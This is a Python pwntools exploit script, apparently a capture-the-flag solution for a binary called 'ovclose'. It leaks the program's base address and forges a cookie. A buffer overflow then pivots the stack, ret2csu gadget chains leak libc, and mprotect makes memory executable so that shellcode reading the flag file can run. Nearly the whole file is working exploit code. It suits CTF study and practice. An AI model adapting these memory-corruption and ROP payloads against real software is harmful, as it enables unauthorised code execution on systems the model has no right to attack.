#coding=utf-8
from pwn import *
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ovclose')
libc = ELF('./libc.so.6') #2.36
elf = ELF('./ovclose')

def pr(a,addr):
	log.success(a+': '+hex(addr))

p.recvuntil("Input your name:\n")
p.send("A"*0x8)
p.recvuntil("A"*0x8)
leak = u64(p.recvuntil("\n",drop=True) + p16(0))
codebase = leak - 0xb46
buf = codebase + 0x202060
cookie = buf ^ 0x15CC15CC15CC15CC
pr('codebase',codebase)

p.sendlineafter('Input your cookie:\n',str(cookie))
p.recvuntil("I won't be able to see anything in the future :(\n")

read_got = codebase + elf.got['read'] #0x201FC0
puts_plt = codebase + 0x900 #elf.plt['puts']
retn = codebase + 0x8b6
leave_ret = codebase + 0xb47 #leave; ret
magic_addr = codebase + 0xa6e #add    DWORD PTR [ebp-0x3d], ebx
prdi_ret = codebase + 0xcb3 #pop rdi ; ret

csu_init_gadget2 = codebase + 0xcaa
''' rsp+
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
retn
'''
csu_init_gadget1 = codebase + 0xc90
'''
mov rdx, r15
mov rsi, r14
mov edi, r13d
call ds:(__frame_dummy_init_array_entry - 201D68h)[r12+rbx*8]
'''

stdout = codebase + 0x202020 # stdout@@GLIBC_2_2_5
magic_offset  = libc.symbols['_IO_2_1_stderr_'] - libc.symbols['_IO_2_1_stdout_'] 
magic_offset += 0x1000000000000000
fake_rbp = codebase + 0x202500
read_main = codebase + 0xc28

payload = 'A'*0x50 + p64(fake_rbp) + p64(read_main)
p.send(payload)

payload1  = p64(csu_init_gadget2)
payload1 += p64(0) #rbx
payload1 += p64(1) #rbp
payload1 += p64(read_got) #r12
payload1 += p64(0) #r13
payload1 += p64(fake_rbp+0x28) #14
payload1 += p64(0xa0) #15
payload1 += p64(csu_init_gadget1) #ret
payload1 += p64(0)*2
payload1 += p64(fake_rbp-0x50-8) + p64(leave_ret)
p.send(payload1)

payload2  = p64(csu_init_gadget2)
payload2 += p64(magic_offset) #rbx
payload2 += p64(stdout + 0x3d) #rbp
payload2 += p64(0)*4 #r12 13 14 15
payload2 += p64(magic_addr) #ret

payload2 += p64(prdi_ret)
payload2 += p64(read_got) #rdi
payload2 += p64(puts_plt) #ret

payload2 += p64(csu_init_gadget2)
payload2 += p64(0) #rbx
payload2 += p64(1) #rbp
payload2 += p64(read_got) #r12
payload2 += p64(0) #r13
payload2 += p64(fake_rbp+0xf8) #14
payload2 += p64(0xa0) #15
payload2 += p64(csu_init_gadget1) #ret
p.send(payload2)

read_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libcbase = read_addr - libc.symbols['read']
pr('libcbase',libcbase)

prsi_ret = libcbase + 0x251be  # pop rsi ; ret
prdx_ret = libcbase + 0x8bcd9 # pop rdx ; pop rbx ; ret
mprotect = libcbase + 0x116e60 # __mprotect

payload3  = p64(prdi_ret) + p64(fake_rbp &~ 0xfff) # 低12位清零
payload3 += p64(prsi_ret) + p64(0x1000) #rdi
payload3 += p64(prdx_ret) + p64(7) + p64(0) # rdx rbx
payload3 += p64(mprotect) #ret 修改一定范围地址可以 rwxp
payload3 += p64(fake_rbp + 0x140) # shellcraft 地址
payload3 += asm(shellcraft.cat("flag", 2))
p.send(payload3)

p.interactive()
